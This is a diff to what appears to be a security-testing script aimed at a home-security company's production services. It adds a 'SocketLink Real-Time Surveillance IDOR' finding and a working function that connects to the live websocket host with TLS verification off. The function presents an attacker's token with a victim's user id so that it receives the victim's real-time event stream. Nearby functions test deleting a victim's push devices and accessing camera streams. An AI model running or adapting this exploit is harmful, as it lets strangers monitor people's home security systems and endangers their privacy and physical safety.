@@ -102,6 +102,13 @@ FINDINGS = [
     Finding("F15", "MEDIUM",   "Internal Architecture Disclosure via Health Endpoints",
             "beta_hub", "/health", "GET", None, verified=True,
             evidence="DynamoDB tables, Kafka topics, MySQL via Falcon client, JWKS cycle"),
+    Finding("F17", "CRITICAL", "SocketLink Real-Time Surveillance IDOR",
+            "socketlink", "wss://socketlink.prd.aser.simplisafe.com/socket.io/", "WS",
+            {"type": "com.simplisafe.connection.identify",
+             "data": {"auth": {"schema": "bearer", "token": "<attacker_token>"},
+                      "join": ["uid:<VICTIM_USER_ID>"]}},
+            notes="CloudEvents identify message; join uid is client-supplied, not derived from JWT. "
+                  "If server trusts uid: prefix without JWT sub check -> full real-time event stream IDOR."),
     Finding("F16", "MEDIUM",   "Unauthenticated Address Geocoding via USPS API Proxy",
             "address_validation", "/v1/addresses", "POST",
             [{"street": "1600 Pennsylvania Ave NW", "city": "Washington", "state": "DC", "zipcode": "20500"}],
@@ -301,6 +308,63 @@ def test_push_notif_idor(token, victim_uid, victim_device):
     if r:
         _print("CRIT" if r.status_code == 200 else "INFO", r.status_code,
                f"delete push device  {r.text[:100]}")
+
+
+def test_socketlink_idor(token, victim_uid, listen_seconds=10):
+    """F17: Subscribe to victim's real-time event stream using own token but victim uid."""
+    print(f"\n=== F17 — SocketLink Surveillance IDOR (victim_uid={victim_uid}) ===")
+    try:
+        import websocket
+        import json as _json
+        import time as _time
+        import datetime
+
+        results = []
+
+        def on_open(ws):
+            payload = {
+                "datacontenttype": "application/json",
+                "id": f"ts{int(_time.time() * 1000)}",
+                "source": "ablation-re-test",
+                "specversion": "1.0",
+                "time": datetime.datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ"),
+                "type": "com.simplisafe.connection.identify",
+                "data": {
+                    "auth": {"schema": "bearer", "token": token},
+                    "join": [f"uid:{victim_uid}"]
+                }
+            }
+            ws.send(_json.dumps(payload))
+            _print("INFO", "SENT", f"identify with uid:{victim_uid}")
+
+        def on_message(ws, msg):
+            _print("CRIT", "RECV", f"{msg[:200]}")
+            results.append(msg)
+            try:
+                d = _json.loads(msg)
+                if d.get("type") == "com.simplisafe.namespace.subscribed":
+                    _print("CRIT", "IDOR", f"Subscribed to uid:{victim_uid} namespace — CONFIRMED")
+            except Exception:
+                pass
+
+        def on_error(ws, err):
+            _print("INFO", "ERR", str(err)[:100])
+
+        ws_url = "wss://socketlink.prd.aser.simplisafe.com/socket.io/?transport=websocket"
+        ws = websocket.WebSocketApp(ws_url,
+                                     header={"Authorization": f"Bearer {token}"},
+                                     on_open=on_open,
+                                     on_message=on_message,
+                                     on_error=on_error)
+        import threading
+        t = threading.Thread(target=ws.run_forever, kwargs={"sslopt": {"cert_reqs": 0}})
+        t.daemon = True
+        t.start()
+        _time.sleep(listen_seconds)
+        ws.close()
+        print(f"  {len(results)} messages received in {listen_seconds}s")
+    except ImportError:
+        print("  websocket-client not installed: pip install websocket-client")
 
 
 def test_camera_stream_idor(token, victim_camera_uuid):
